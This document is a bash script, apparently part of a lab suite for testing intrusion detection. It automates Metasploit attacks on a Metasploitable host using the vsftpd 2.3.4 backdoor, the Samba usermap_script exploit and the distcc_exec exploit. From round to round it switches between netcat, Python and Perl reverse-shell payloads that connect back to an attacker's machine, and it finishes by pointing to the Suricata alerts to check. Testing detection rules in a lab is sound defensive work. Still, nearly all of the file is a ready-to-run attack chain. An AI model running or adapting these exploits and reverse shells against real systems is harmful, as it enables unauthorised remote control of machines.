#!/bin/bash

# =================================================================
# MODULE 07: REMOTE CODE EXECUTION (METASPLOIT) - PAYLOAD ROTATION
# Strategy: 3 Level Depth (Backdoor, Encoded Payload, Alt Vector)
# Input: Receives argument $1 as the Round Number
# =================================================================

# Receive Input Round Number from Daily Round
ROUND=${1:-1} # Default to round 1 if empty

# CONFIGURATION
TARGET_IP="192.168.x.x"   # Replace with your Metasploitable IP
LHOST="192.168.x.x"      # IMPORTANT: Replace with your Kali Linux IP!
RC_SCRIPT="logs/auto_exploit.rc"
LOG_FILE="logs/rce_console_output.txt"

# Colors for Report Display
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# =================================================================
# PAYLOAD ROTATION LOGIC (PAYLOAD DIVERSITY)
# Changes the reverse shell type (bash vs python vs perl)
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Round 1-10) ---
    # Payload: Generic Unix Command (usually netcat/bash pipe)
    PAYLOAD_TYPE="cmd/unix/reverse"
    DESC_PAYLOAD="Double Reverse TCP (Netcat)"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Round 11-20) ---
    # Payload: Python Inline Script
    # Network signature will contain the python string (import socket...)
    PAYLOAD_TYPE="cmd/unix/reverse_python"
    DESC_PAYLOAD="Python Inline Reverse Shell"

else
    # --- SET C (Round 21-30) ---
    # Payload: Perl Inline Script
    # Signature differs again (perl -e 'use Socket...')
    PAYLOAD_TYPE="cmd/unix/reverse_perl"
    DESC_PAYLOAD="Perl Inline Reverse Shell"
fi

echo "[+] [07_RCE] Starting Metasploit RCE Module..."
echo "[+] Target: $TARGET_IP"
echo "[+] Attacker (LHOST): $LHOST"
echo "[+] Mode: Round $ROUND ($DESC_PAYLOAD)"

# Check whether LHOST is set correctly (safety check)
if [[ "$LHOST" == "192.168.1.YYY" ]]; then
   echo -e "${RED}[!] ERROR: Replace the LHOST variable in the script with your Kali Linux IP!${NC}"
   echo "    (Metasploit requires LHOST for the reverse shell)"
   exit 1
fi

# -----------------------------------------------------------------
# CREATE METASPLOIT RESOURCE SCRIPT (.rc) - DYNAMIC
# We generate this file using the $PAYLOAD_TYPE variable
# -----------------------------------------------------------------
cat <<EOF > $RC_SCRIPT
# --- GLOBAL CONFIGURATION ---
setg RHOSTS $TARGET_IP
setg LHOST $LHOST
setg VERBOSE true
setg WfsDelay 10

# LEVEL 1: VSFTPD (BASELINE - STATIC)
# This module uses a hardcoded payload (cmd/unix/interact), so it is not changed.
use exploit/unix/ftp/vsftpd_234_backdoor
run -z
sleep 5

# LEVEL 2: SAMBA (DYNAMIC)
use exploit/multi/samba/usermap_script
set PAYLOAD $PAYLOAD_TYPE
run -z
sleep 5

# LEVEL 3: DISTCC (DYNAMIC)
use exploit/unix/misc/distcc_exec
set PAYLOAD $PAYLOAD_TYPE
run -z

# IMPORTANT EXIT COMMAND
# exit -y forces Metasploit to exit even if a session is active
exit -y
EOF

# -----------------------------------------------------------------
# REPORT DISPLAY (VERBOSE)
# -----------------------------------------------------------------

# LEVEL 1
echo -e "${CYAN}[REPORT] Level 1: Vsftpd 234 Backdoor (Port 21)${NC}"
echo -e "${YELLOW}    [Exploit] : exploit/unix/ftp/vsftpd_234_backdoor${NC}"
echo -e "${YELLOW}    [Payload] : cmd/unix/interact (Default Baseline)${NC}"
echo -e "    [Info] Testing classic backdoor signature detection"

# LEVEL 2
echo -e "${CYAN}[REPORT] Level 2: Samba Usermap Script (Port 139/445)${NC}"
echo -e "${YELLOW}    [Exploit] : exploit/multi/samba/usermap_script${NC}"
echo -e "${YELLOW}    [Payload] : $PAYLOAD_TYPE ($DESC_PAYLOAD)${NC}"
echo -e "    [Info] Testing command injection detection with variable payloads"

# LEVEL 3
echo -e "${CYAN}[REPORT] Level 3: DistCC Daemon Execution (Port 3632)${NC}"
echo -e "${YELLOW}    [Exploit] : exploit/unix/misc/distcc_exec${NC}"
echo -e "${YELLOW}    [Payload] : $PAYLOAD_TYPE ($DESC_PAYLOAD)${NC}"
echo -e "    [Info] Testing exploit detection on an uncommon port"

echo ""

# -----------------------------------------------------------------
# RUN METASPLOIT
# -----------------------------------------------------------------
echo -e "${CYAN}[ACTION] Launching the Metasploit Framework...${NC}"
echo "    (Please wait, the MSFConsole loading process takes 1-2 minutes...)"
echo "    (The script runs automatically using the resource file: $RC_SCRIPT)"

# Execute (output redirected to a unique log file per round)
msfconsole -q -r $RC_SCRIPT > logs/rce_console_output_r${ROUND}.txt 2>&1

echo -e "${CYAN}    -> Completed.${NC}"
echo "    -> Full Metasploit output stored at: logs/rce_console_output_r${ROUND}.txt"
echo "    -> Check Suricata alerts for: ET EXPLOIT Vsftpd / GPL NETBIOS / ET DAEMON"

echo "[+] [07_RCE] Module Finished at $(date)"
echo "-----------------------------------------------------------"